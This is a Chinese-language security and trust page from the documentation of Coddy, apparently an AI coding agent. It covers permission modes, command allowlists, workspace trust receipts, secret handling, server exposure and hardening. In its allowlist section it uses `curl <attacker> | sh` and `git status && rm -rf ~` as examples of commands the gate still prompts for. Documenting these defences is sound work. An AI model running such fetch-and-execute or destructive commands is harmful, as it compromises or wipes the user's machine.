# 安全与信任

Coddy 以其启动它的用户的权限，在运行所在的机器上执行模型决定的内容。本页集中说明约束这一点的内容：权限门禁与各模式、随检出代码到达的文件的信任回执、机密存放的位置与脱敏的位置、HTTP、Telegram 和集群界面暴露的内容、作为策略层的钩子、循环防护，以及完全不在沙箱内的内容。每个章节都指向承载细节的页面。

关于仓库自身的 AppSec 态势（trivy、semgrep 和 govulncheck 在本地与 CI 中运行、严重性门禁与分诊），请参见 [AppSec 扫描](../contributing/security-scanning.md)。

## 哪些内容不在沙箱内

不存在内核级沙箱。`run_command` 以启动 Coddy 的用户的身份通过主机 shell 运行，文件工具也以该用户的权限读写；权限提示、模式或钩子决定一次调用是否运行，而不决定该进程在运行后能触及什么。Coddy 所设计的隔离是容器：二进制是静态的且对 distroless 友好，因此可放入 `scratch` 或 `distroless` 镜像，配合只读根文件系统、挂载的工作区以及编排器的限制（发布的镜像在端口 12345 上运行 `coddy serve -H 0.0.0.0`；请参见 [Docker](../getting-started/docker.md)）。在容器之外，在 `ask` 模式下绑定到回环地址时，边界就是回答提示的人。

控制台会从渲染器之外传来的一切内容（模型输出、工具预览、标题、文件名）中剥离转义序列和控制序列，因此工具结果无法驱动终端；请参见 [控制台](../surfaces/console.md#安全)。

## 权限模式与提示

会话在三种权限模式之一中运行：

| 值 | Shell 命令 | 文件写入 |
|---|---|---|
| `ask`（默认） | 提示 | 提示 |
| `accept_edits` | 提示 | 在工作区内自动批准；在其他位置提示 |
| `bypass` | 从不询问，除非钩子的 `ask` 以及 [决策检查](../features/decisions.md) 未放行的命令 | 从不询问，除非钩子的 `ask` |

在 `accept_edits` 下，只有当写入所命名的每个路径都位于会话的工作区内（其工作目录及其携带的附加目录，并解析链接）时，写入才会在没有提示的情况下被批准。写入 `${CODDY_HOME}`（`hooks.json`、`mcp.json`、`config.yaml`、信任回执）或工作区之外的任何其他位置都会询问，原因与 `config_commit` 相同：它可以改变运行什么以及允许什么。写入 `.git` 文件夹（其钩子和配置会在下一次 git 命令时运行命令）也是如此，删除或移动一个包含 `.git` 条目或主目录的文件夹同样如此。

该模式不是配置：`config.yaml` 没有用于它的键。新会话以操作员最后一次选择的模式启动，在任何界面上都是如此 - ACP 编辑器的权限模式选择器、控制台或 Web 界面中的 `/permissions`、输入框的权限标签、带 `permissionMode` 的 `PATCH /coddy/sessions/{id}`、权限提示中的 **本次会话绕过** 选项（[会话设置](../features/session-settings.md#从权限对话框切换)） - 并且在做出任何选择之前处于 `ask`。Coddy 将该选择保存在 `${CODDY_HOME}/permission-mode.json` 中。控制台的 `--permission-mode` 启动标志不是一种选择：从命令行运行是它自己的任务，因此该标志设置该次运行所打开会话的模式，并让新会话启动时的模式保持原样（通过 `--remote` 时，它会像 `/permissions` 一样到达服务器）。每个会话在其元数据中保留自己的模式（在其 `session.json` 中的 `sessionPermissionMode`），直到该会话被切换，因此之后在另一个会话中做出的选择不会改变它，而且该模式在重启后仍然存在：为无人值守运行切换到 `bypass` 的会话会一直保持在 `bypass`，直到有人将其切回。仅用于后续轮次的模式（`--once`、`--count=N`）不是一种选择：它存在于进程中，不会被写入，也不会改变新会话启动时的模式。由旧版本保存、文件中没有自身模式的会话在再次打开时采用当前默认值。模型使用 `question` 工具提出的问题不是权限请求：它在每种模式下都会阻塞该轮次，直到有人回答，包括 `bypass`。`bypass` 适用于可丢弃的机器。

无人值守的服务器或 CI 运行器（Docker、systemd、流水线）没有人来切换会话。在会话中一次性选择模式 - 在控制台或 Web 界面中使用 `/permissions bypass` - 或者在首次启动前写入文件：

```json
{"permissionMode": "bypass"}
```

CI 步骤可以改为在每次运行时传入 `--permission-mode`：该标志仅设置该次运行会话的模式。设置 `tools.permission_mode` 的旧版 `config.yaml` 会保留其模式：下一次启动会在尚未做出任何选择时将值移入 `permission-mode.json`（文件中已有的选择优先），从 `config.yaml` 中删去该键，并将旧文件保留为 `config.yaml.bak-<time>`；`coddy -t` 会将该键报告为警告。

提示 - Web 界面中的权限卡片、控制台中的模态框、编辑器中的 `session/request_permission` - 提供 **允许**、**始终允许**（此确切命令，在本次会话的剩余时间内）、**拒绝**，对于单条普通 shell 调用还提供 **始终允许 `<program>`**，这会将授权扩大到该程序（`curl`），对于多路复用器则扩大到程序及其子命令（`git status`；`git push` 仍会询问）。带有 shell 元字符或前导 `VAR=` 的命令永远不会获得宽泛选项，而会话授权只会覆盖另一次普通调用，因此即使已授予 `curl`，`curl <attacker> | sh` 也会再次询问。后台命令经过同一门禁。[后台任务](../features/background-tasks.md#权限) 给出了确切规则；`tools.command_allowlist` 是操作员编写的从不提示的命令列表（对所有内容使用 `"*"`；[config.yaml 参考](../reference/config.md#tools)）。

允许列表条目覆盖其自身的命令，可以是精确匹配，也可以是在空格后带参数，并且绝不覆盖写在它之后的命令。在 bash 或 sh 下，只有当一行中的每个命令都被覆盖时，该行才会在没有提示的情况下运行 - 用 `&&`、`||` 或 `;` 链接的命令、用 `&` 发送到后台的命令、通过管道连接的命令或各自位于单独行上的命令 - 因此，在列出了 `git status` 和 `go test` 的情况下，`git status && go test ./...` 会运行，而 `git status && rm -rf ~` 会询问。命令替换（`$(...)`、反引号）、`${...}` 或 `$[...]` 展开（其中的 bash 算术可以运行命令；普通的 `$NAME` 不会让一行发出询问）、进程替换、重定向（`<`、`>`）、括号、注释以及 ANSI-C `$'...'` 字符串始终会询问，因为没有条目显示它们运行或写入什么。PowerShell 和 cmd.exe 的引号和转义方式与 POSIX shell 不同，因此在那里，条目仅覆盖不含 `| & ; < > ( ) $ ^ %`、反引号或换行符的命令。与条目完全相等的一行仍按原样被覆盖。

条目确实为其命令的每个参数背书，包括那些使程序运行或加载其他内容的参数：`go test` 覆盖 `go test -exec ./script ./...`，`make test` 覆盖 `make test -f other.mk`，`find .` 覆盖 `find . -delete`。任何形式的条目都不会拒绝某个参数，因此请将那些参数可以运行其他代码的程序排除在列表之外（`find`、`xargs`、`env`、`make`、诸如 `python` 或 `node` 的解释器），除非它们可以运行任何内容，并让它们的调用发出提示。

该门禁不覆盖的内容：

- MCP 工具调用在没有提示的情况下被分派；启用开关和 `disabledTools` 是限制它们的机制（[MCP 服务器](../features/mcp.md#权限模型)）；
- `websearch` 和 `webfetch` 不询问任何人；
- 控制台的 `!!` 前缀会在完全没有门禁的情况下运行命令，这是有意为之：只有提交的编辑器行才能到达它，模型输出永远不能（[控制台](../surfaces/console.md)）。

模型自行构造的 HTTP 请求（`http_request`）在 `ask` 和 `accept_edits` 下会以请求将要发出的样子提示 - 地址、标头、正文、它上传的本地文件、代理、未检查的证书、它保存的文件。其 "始终" 选项指定一个地址或整个源，并且它们会批准该请求随目的地一起携带的内容，因此已批准的源绝不会批准对没人见过的文件的上传。`tools.http_request.allowlist` 指定从不询问的目的地。该工具不拒绝任何地址 - 包括 localhost、私有网络和云元数据地址 - 因此在 `bypass` 下，它能到达主机所能到达的任何地方（[HTTP 请求](../features/http-requests.md#权限)）。`tools.http_request.default_headers` 会随每一个此类请求一起发送，发往每一个目的地：放在那里的凭据会到达模型发送请求的任何地址，因此只有当这是意图时，它才应放在配置中。提示会列出已配置的标头，并且只显示描述客户端的那一个的值，例如 `User-Agent`，而 `config_get` 从不向模型显示它们的值（[默认标头](../features/http-requests.md#凭据)）。

配置提交（`config_commit`）的门禁比写入更严格：它在 `ask` 和 `accept_edits` 中会提示，因为它可以启动 MCP 进程并更改策略本身；只有 `bypass` 会跳过它。

没有人员回答的界面会自行处理提示。打印模式（`coddy -p`）在 `bypass` 下允许，但强制提示（钩子的 `ask`、决策检查未放行的命令）除外，否则拒绝。Telegram 网关会批准聊天智能体自身的提示，以便机器人可以无人值守地工作；被收窄的子智能体如果其自身模式不是 `bypass`、`PreToolUse` 钩子的 `ask` 以及 [决策检查](../features/decisions.md) 未放行的命令，则改为在聊天中通过 **允许** / **拒绝** 按钮询问，并且只有其会话发起询问的人才能回答。由完成的后台任务唤醒的轮次会在有人能回答的地方询问：控制台的模态框、`coddy acp` 下的编辑器，以及在 `coddy serve` 上绑定到该会话的 Telegram 聊天（遵循聊天自身的规则），否则是 Web 界面和跟随该轮次的控制台，提示在那里等待并持久化，直到其中一方回答；只有没有界面可显示该会话的 `coddy serve` 才会拒绝其中的受门禁调用，除非其模式是 `bypass`（强制提示在 `bypass` 下也会被拒绝）。在生成它的轮次结束后才询问的分离子智能体会被保留，而不是自动回答：其提示会在它所属的对话中等待 - Web 界面中的父聊天、控制台的模态框（也可通过 `--remote`）、该会话的 Telegram 聊天 - 直到有人回答或运行超时；如果没有任何东西能显示它（`coddy acp`、打印模式、计划运行），则会以子智能体报告的原因拒绝。

模式在权限生效之前限定工具集：`plan` 仅写入文本和 markdown，而 `ask` 获得只读允许列表（`read`、`keep_result`、`glob`、`grep`、`print_tree`、`websearch`、`webfetch`、`question`、`load_skill`、`coddy_docs_search`、`coddy_docs_read`），该列表在调用执行时强制执行，因此从历史记录重放的调用会被拒绝而不是运行。请参见 [操作模式](../features/modes.md)。子智能体定义只能收窄父级的 `permission_mode`、`tools` 和 `disallowed_tools`，子级的提示会以 `[subagent <name>]` 前缀转发到父级的客户端（[子智能体](../features/subagents.md)）。

## 项目本地文件的工作区信任

检出代码内的四类文件可以在任何提示出现之前让 Coddy 启动进程、将代码取到你的主目录或引导模型。这四类文件都受同一种策略约束，直到操作员为该工作区批准该确切文件或条目：

| 内容 | 工作区下的文件 | 策略键 | 回执 | 批准方式 |
|---|---|---|---|---|
| MCP 服务器 | `.coddy/mcp.json` | `mcp.project_trust` | `$CODDY_HOME/mcp-trust.json` | `coddy mcp trust <name>`、`POST /coddy/mcp/{name}/trust`、设置 > MCP 服务器中的盾牌 |
| 钩子 | `.coddy/hooks.json`、`.claude/settings.json`、`.claude/settings.local.json` | `hooks.project_trust` | `$CODDY_HOME/hooks-trust.json` | `coddy hooks trust <file>`、`POST /coddy/hooks/trust` |
| 子智能体 | `.agents/agents/*.md`、`.coddy/agents/*.md`（以及工作区内的 `subagents.dirs` 条目） | `subagents.project_trust` | `$CODDY_HOME/subagents-trust.json` | `coddy agents trust <name>`、`POST /coddy/subagents/{name}/trust`、设置 > 子智能体中的盾牌 |
| 技能市场 | `.coddy/marketplaces.json` | `skills.project_trust` | `$CODDY_HOME/skills-trust.json` | `coddy plugin marketplace trust <name or source>`、`POST /coddy/skills/sources/trust`、设置 > 技能中的盾牌 |

每种策略采用 `ask`（默认：被解析并列出，保留到批准为止）、`allow`（像你自己的文件一样对待，适用于你已信任的检出）或 `deny`（从不使用）。回执以规范工作区路径（链接的 git worktree 使用其主检出的路径，见 [Git worktrees](../features/worktrees.md#worktree-与其主检出共享的内容)）和已批准内容的摘要为键，因此在已批准的文件或声明被编辑后，下一次会话会再次询问，除非该项目的另一个检出已批准新内容；来自 Web 界面的批准还会指明它当时看到的摘要，而在此期间被重写的文件会被拒绝，而不是在未看见的情况下被批准。MCP 批准还会记录声明所读取的你环境中的变量，因此，在 `${NAME}` 于项目文件中展开之前批准的项目服务器，一旦其值命名了某个变量，就会再次被询问。四个回执文件被有意分开：MCP 批准绝不能读作钩子批准，反之亦然。市场条目决定什么可以安装到 `${CODDY_HOME}/skills`，每个工作区的每个会话都会在那里读取它，因此被保留的条目既不会被读取，也不会被提供安装，而聊天的 `/plugin` 不能批准条目。每个批准界面都会先打印有效声明 - 对于 MCP 服务器，是命令、其参数、它携带的环境变量和标头的名称，以及其值所读取的你环境中的变量（`${NAME}`，项目的 `.coddy/mcp.json` 可以像你自己的文件一样使用它），绝不显示它们的值。

你自己的文件不受门禁：`config.yaml`、`~/.coddy/mcp.json`、`~/.coddy/hooks.json`、`~/.coddy/agents` 和 `~/.coddy/marketplaces.json` 由操作员编写，ACP 客户端在 `session/new` 中声明的 MCP 服务器也是如此；内置的 `rpa-skills` 市场（`EvilFreelancer/rpa-skills`）作为 Coddy 的一部分受到信任。工作目录中的 `config.yaml` 除非你命名它，否则根本不会被读取，因为它可能随检出代码一起到来（[配置](../getting-started/configuration.md)）。`coddy acp` 和 `coddy serve` 接受 `--mcp-project-trust ask|allow|deny` 来为一个进程设置 MCP 策略，CI 任务或容器入口点使用它而不是编辑文件。完整细节：[MCP 服务器](../features/mcp.md#面向项目本地服务器的工作区信任)、[钩子](../features/hooks.md#项目文件与信任)、[子智能体](../features/subagents.md#作用域与项目信任)、[技能](../features/skills.md#项目市场与信任)。

来自检出代码的规则和技能是不同类型的内容，不携带回执：`.coddy/rules`、共享的 `.agents/rules`、`.cursor/rules`、`.claude/rules`、`.codex/rules`、嵌套的 `AGENTS.md` 文件，以及项目 `.agents/skills` 和 `.coddy/skills` 下的技能，都是引导模型的文本，会在会话于该工作区打开时立即从工作区加载。（`~/.coddy/AGENTS.md`、`~/.coddy/DESIGN.md` 和 `~/.coddy/rules` 以同样的方式读取，但并非来自任何地方：它们是你自己的文件，位于你的 `config.yaml` 旁边，没有 `git clone` 会写入它们。）它们可以要求模型运行某些东西；它们自己不能运行它，因此它们要求的任何内容仍然要经过模式、权限门禁和你的钩子。像阅读检出代码的构建脚本那样阅读它的规则。参见 [规则](../features/rules.md) 和 [技能](../features/skills.md)。

![项目本地 MCP 服务器在设置中等待批准](../../assets/screenshot-fullhd-settings-mcp.png)

发现被保留的钩子文件的会话会记录一条通知，这样你会知道钩子存在且被保留，而不是被静默跳过：

![被保留的钩子文件通知](../../assets/screenshot-hooks-notice-dark.png)

## 机密

- **提供商密钥。** `providers[].api_key` 是字面量、在文件加载时展开的 `${ENV}` 引用，或为空；为空时，在调用时读取 `NAME_API_KEY`（提供商名称转为大写，连字符变为下划线）。`api_key_command` 通过主机 shell 运行凭据助手，限制为 30 秒，并在 `api_key` 为空时使用其 stdout；顺序是字面量、然后是助手、然后是环境变量。`codex` 行完全不接受密钥：它使用 ChatGPT 登录，留在其上的 `api_key_command` 永远不会运行。保持 `config.yaml` 不含字面量密钥，并引用环境。
- **`.env` 文件。** `$CODDY_HOME/.env` 在解析 `config.yaml` 之前读取，每行一个 `KEY=VALUE`（接受 `export`、引号和注释）；进程中已设置的环境变量永远不会被覆盖。值中的字面美元符号写作 `$$`。参见 [配置](../getting-started/configuration.md)。
- **提供商登录。** `coddy providers login codex`、`coddy providers login neuraldeep`、`coddy providers login opencode` 和 `coddy providers login devin`（对于前三个，还有 Web 界面中的登录按钮）将颁发的凭据存储在 `$CODDY_HOME/providers/<name>/` 下 - `codex-auth.json`、`neuraldeep-auth.json`、`opencode-auth.json`、`devin-auth.json` - 在通过 `0700` 创建的目录中，文件权限为 `0600`。`coddy providers list` 显示每个请求实际使用哪个来源，`coddy providers logout <name>` 撤销并忘记登录（对于 Devin，它忘记本地令牌；Devin 会话在 Devin 一侧结束；对于 OpenCode，它忘记本地凭据，账户会话或服务账户密钥在 OpenCode 控制台中撤销）。当不存在 Coddy 登录时，`devin` 行还会读取 Devin CLI 自己的 `credentials.toml`，并且从不写入它；Devin 浏览器登录仅监听 `127.0.0.1`，并以恒定时间检查 `state`，与 NeuralDeep 的登录相同。
- **脱敏。** `GET /coddy/config` 从不返回 `httpserver.auth_token`、登录密码哈希、集群令牌（`swarm.auth_token`、`swarm.pairing_tokens`、加入条目的 `pairing_token` 和 `token`）或 `metrics.token`：它会报告已设置（`auth_configured`、`login_configured`、`pairing_configured`、`token_configured`），而将字段留空的保存会保留已存储的值；来自设置界面的保存会将 `${VAR}` 引用写回为引用，而不是写回它解析出的机密；`coddy -t` 和 `--dry-run` 从不在机密形状的键（`api_key` 以及任何 `*_api_key`，例如 `tools.websearch.brave_api_key`、`auth_token`、`pairing_tokens`）下回显值，并在错误中掩盖 Telegram 令牌；配置提交提示会列出暂存的命令，并对机密脱敏；`GET /coddy/mcp` 会列出 MCP 声明的环境变量和标头，用 `<redacted>` 代替每个值，从探测错误中清除声明解析出的值，并且从其编辑器保存时，仅对它当时显示的声明保留隐藏值（命令、其参数和 URL 按原样列出，因此请将机密放在 `env`、`headers` 或环境中，作为 `${NAME}`，见 [MCP 服务器](../features/mcp.md#管理-api-与-ui)）；集群代理会替换调用方的 `Authorization` 标头，而不是转发它。
- **传输中的令牌。** 控制台和 `coddy acp` 从 `--remote-token` 获取用于 `--remote` 的令牌，然后从匹配的 `httpserver.remotes` 条目的 `token` 获取，然后从 `CODDY_REMOTE_TOKEN` 获取；即将通过明文 `http://` 发往非回环主机的令牌会产生警告。远程的 `token` 是可选的，并且与 `auth_token` 不同，它会由 `GET /coddy/config` 发回，因为配置它的机器上的 Web 界面会呈现它：每个打开该界面的浏览器都会收到它，因此请将其写为 `${ENV}` 引用或省略它。没有它时，Web 界面仅在浏览器中保留远程令牌。参见 [令牌](remote.md#令牌)。
- **磁盘上的对话记录。** `$CODDY_HOME/sessions/<id>/` 下的每个会话包都在 `messages.json` 中保存完整对话，包括工具输出，并在 `assets/` 下保存附加到它的文件（以只读方式写入，`0444`）。任何能读取主目录的人都能读取每个对话；`sessions.dir` 移动存储位置，`/export` 按请求将副本写入工作区。

## HTTP 表面

除非 `httpserver.host` 或 `-H` 另有说明，`coddy serve` 绑定 `127.0.0.1:12345`，并且它 **默认没有登录**：当 API 可访问时，网络上的任何人都拥有每条路由，包括配置编辑器（`PUT /coddy/config`）和工作区文件。仅在你信任的网络上暴露该端口，或者：

- 设置 bearer 令牌 - `httpserver.auth_token`（展开 `${ENV}`）、`--auth-token` 或 `CODDY_HTTP_TOKEN`；然后每个 `/v1/*` 和 `/coddy/*` 路由在没有 `Authorization: Bearer` 时回答 `401`，SPA 外壳保持公开，并且除非 `httpserver.public_docs: true`，`/docs` 和 `/openapi.*` 受到保护；
- 用账户关闭浏览器界面 - `coddy serve set-password`，或在 `$CODDY_HOME/.env` 中设置 `CODDY_HTTP_USER` / `CODDY_HTTP_PASSWORD`；然后浏览器在表单上登录并携带 `HttpOnly` cookie，这会像令牌一样门禁相同的路由。令牌用于 API 客户端，表单用于浏览器：当浏览器以外的任何东西与服务器通信时，**两者都** 要设置，因为仅密码会使 `coddy --remote`、`coddy acp --remote`、集群中继和每个脚本没有凭据；
- 在前面放置终止 TLS 的反向代理，因为服务器使用明文 HTTP；
- 仅为需要它的源启用 CORS（`httpserver.cors`），并按此顺序：先精确匹配 `allowed_origins`，然后是 `allow_loopback`（用于笔记本电脑自身的 `coddy serve` 在任何回环端口上），最后是 `"*"`。三者都不是凭据：CORS 决定浏览器是否向页面显示答案，令牌或登录表单决定服务器是否给出答案。因此，在两者都没有的服务器上，`allow_loopback` 会将 API - 带有提供商密钥的 `GET /coddy/config`、带有 shell 工具的轮次 - 交给从浏览器自身机器提供的每个页面（开发服务器、桌面应用的页面），而 `"*"` 会交给任何地方的每个页面；当任一者在没有凭据的情况下开启时，`coddy serve` 会在启动时警告，`--dry-run` 会报告它，无论绑定地址如何，而 `httpserver.allow_insecure` 像其他项一样使该警告静默。两个回环端口属于同一个站点，因此登录 cookie 确实会从另一个本地端口上的页面传来；使该页面无法进入的是服务器从不设置 `Access-Control-Allow-Credentials`（浏览器不提供答案），并用 `403` 拒绝来自另一个源的 cookie 认证写入；
- 优先使用标头而不是 `?access_token=`，后者只有两条 SSE 路由接受，并且会进入代理访问日志；
- 将 `httpserver.allow_insecure` 保持未设置：它表示没有凭据的服务器是有意开放的，因此它会静默关于此的两条启动警告 - 非回环绑定，以及允许未列出的页面的 CORS - 并带有与其对应的 `--dry-run` 发现，还会关闭对回环上外部 `Host` 的拒绝以及对跨源写入的拒绝。

登录表单存储 argon2id 哈希，从不存储明文密码，而 `GET /coddy/config` 仅报告账户存在及其来源。错误密码会以恒定时间回答，并按源地址逐渐变慢，在判断之前计数，因此突发尝试也要付出等待代价；回环地址除外，以免机器锁死自己 - 而在反向代理之后，每个请求都来自回环，转发来的客户端地址才是节流计数的对象。会话 cookie 为 `HttpOnly` 和 `SameSite=Strict`，因此没有脚本能读取它，另一个站点引发的请求也不会携带它；除此之外，更改状态的 cookie 认证请求除非来自此源（`Sec-Fetch-Site` 或 `Origin`），否则会被拒绝，而 bearer 请求不受该检查约束。会话仅保存在内存中，因此重启进程会结束它们，轮换密码会结束它打开的每个会话。

Docker 镜像在容器内绑定 `0.0.0.0`，因此映射的端口可从其发布到的任何地方访问。除非 `CODDY_HTTP_BIND` 另有说明，compose 文件将其发布到主机的回环地址上，而普通的 `docker run -p 12345:12345` 会将其发布到每个接口；像对待任何管理 API 一样对待它。没有凭据的服务器仍然会拒绝另一个站点试图更改某些内容的页面（[HTTP API](../reference/http-api.md#身份验证可选)），在回环上还会拒绝它不知道的主机名。参考：[HTTP API](../reference/http-api.md#身份验证可选)、[Web 界面登录](../reference/http-api.md#web-ui-登录可选)、[远程模式](remote.md)。

## Telegram 网关

每条传入消息都会检查访问权限，被拒绝的消息会被静默丢弃。`admins` 列出具有提升权限的 Telegram 用户 ID；`default_access` 是 `all`（任何能向聊天写入的人）、`admins`，或 `group:<name>`（用于在 `user_groups` 下定义的集合）；`chats[]` 按聊天覆盖 `access` 和 `isolation`（`individual`、`shared`、`admin`）。机器人令牌应放在环境中（`"${TELEGRAM_BOT_TOKEN}"`），绝不要放在版本控制中。网关使用长轮询，因此不会打开入站端口。由于网关会自行批准其智能体的权限提示，权限模式不会约束机器人：请用 `PreToolUse` 钩子（见下文：`deny` 拒绝，`ask` 在聊天中询问）、[决策检查](../features/decisions.md)、容器或限制谁可以与它交谈来约束它。参见 [Telegram 网关](../surfaces/gateway.md#安全说明)。

## 集群

中继携带三种凭据，承担三项职责：`swarm.auth_token` 让客户端使用中继，`swarm.pairing_tokens` 让节点加入中继，而每节点令牌让中继充当该节点。中继是覆盖整个集群的大门 - 持有其客户端令牌的人控制它能到达的每个节点，并且没有按节点的客户端 ACL - 因此请为每个节点颁发为其中继铸造的凭据，并保密配对令牌。绑定在回环之外且没有客户端令牌的中继会拒绝启动（`swarm.allow_insecure` 可覆盖）；在回环上，每次运行都会生成一个。节点名称由按租约的机密证明，而不是由共享配对令牌证明。公布的 URL 是 SSRF 边界：仅允许 `http(s)`，不允许凭据；链路本地、元数据以及（除非 `swarm.allow_private_upstreams` 命名它们）私有地址都会被拒绝，并且解析后的地址会被固定。中继的 TLS 是 `swarm.tls.cert_file` / `key_file`（最低 TLS 1.2，轮换需重启），并且每次使用 `insecure_skip_verify` 时都会记录日志。参见 [集群](swarm.md#安全性) 和 [加密与代理](swarm.md#加密与代理)。

## 指标导出器

Prometheus 导出器（[监控](monitoring.md)）是它自己的监听器，默认关闭，并且除非 `metrics.host` 另有说明，会绑定 `127.0.0.1:12347`。它提供 `GET /metrics`，并对其他所有路径回答 `404`。它报告的是计数、持续时间和状态：没有提示、标题、文件夹、会话 ID 或工具名称。设置 `metrics.token` 后，抓取必须将其作为 `Authorization: Bearer` 呈现，否则会回答 `401`；比较是恒定时间的，并且每个请求都会读取令牌，因此更改会立即生效。该令牌仅打开 `/metrics`，没有 API 令牌或登录会打开导出器。没有令牌时，端点对任何能到达该端口的人开放。在没有令牌的情况下绑定到回环之外时，`coddy serve` 会在启动时警告，`--dry-run` 会报告一条指向 `metrics.host` 行的警告。在容器中，绑定必须是 `0.0.0.0`，因此请在那里设置令牌。集群中继不会携带其节点的导出器，因此每个节点都在自己的端口上抓取。

## 作为策略层的钩子

`PreToolUse` 钩子在每个匹配调用的权限提示之前运行，无论权限模式如何，在子会话中也是如此，并且可以拒绝调用（退出 `2`，或 `permissionDecision: "deny"`）、强制提示（`"ask"`）或重写参数。使用 `failClosed: true` 时，钩子的崩溃或超时会阻塞调用而不是让它通过，这正是策略钩子想要的。`UserPromptSubmit` 可以拒绝提示，`SubagentStart` 可以拒绝委托，`PreCompact` 可以否决压缩，`Notification` 可以在提示等待时通知你。钩子以你的权限运行并看到每个参数，因此请审查每一个；你自己的文件 `~/.coddy/hooks.json` 始终运行，而项目文件遵循上面的信任策略。无论模式如何都阻止 `rm -rf` 的完整示例在 [钩子](../features/hooks.md#示例) 中。

## 循环防护与上限

`agent.max_turns` 默认将单个用户轮次的 ReAct 步数限制为 165；仅为了显式禁用上限才将其设置为 `0`。它停止的轮次会以一条指明它的通知结束。`agent.loop_guard`（默认 `true`）会截断退化为重复同一段落的流式响应（`loop_stream_repeat_cycles`），停止执行被反复以相同参数调用的工具（`loop_tool_repeat_limit`），将模型推回正轨，并在 `loop_nudge_max` 次推动后以通知结束该轮次。工具结果在 `tools.output_limits` 下按行限制，每次调用有 64 KiB 上限，因此一个巨大的行无法绕过限制。`Stop` 钩子每轮最多可让智能体返回工作 `hooks.stop_loop_limit` 次（5）；后台任务受 `tools.background.max_concurrent`（5）和 `default_timeout_seconds`（900）限制；子智能体受 `subagents.max_concurrent`、`max_depth` 和 `default_timeout_seconds` 限制。

## 在暴露服务器之前

- 已设置 bearer 令牌，并且通过环境或标志到达进程，而不是作为文件中的字面量；
- 浏览器界面有账户（`coddy serve set-password`，或 `CODDY_HTTP_USER` / `CODDY_HTTP_PASSWORD`），因此发现端口的页面会被询问它是谁；
- TLS 在服务器前面终止，或者客户端通过隧道进入；
- 指标导出器开启时，监听回环地址或已设置 `metrics.token`；
- `httpserver.cors` 仅允许需要它的源，并且 `allow_loopback` 或 `"*"` 仅在令牌或登录表单之后开启；
- 对于你无法控制的检出，`mcp.project_trust`、`hooks.project_trust`、`subagents.project_trust` 和 `skills.project_trust` 为 `ask` 或 `deny`；
- 除非主机可丢弃，会话和新会话启动的模式（`${CODDY_HOME}/permission-mode.json`）都不是 `bypass`，并且 `failClosed` `PreToolUse` 钩子覆盖提示无法覆盖的内容；
- 进程在具有只读根文件系统且仅挂载工作区的容器中运行。

<!-- docsgen:source sha256=924284fe89bdeb3d -->
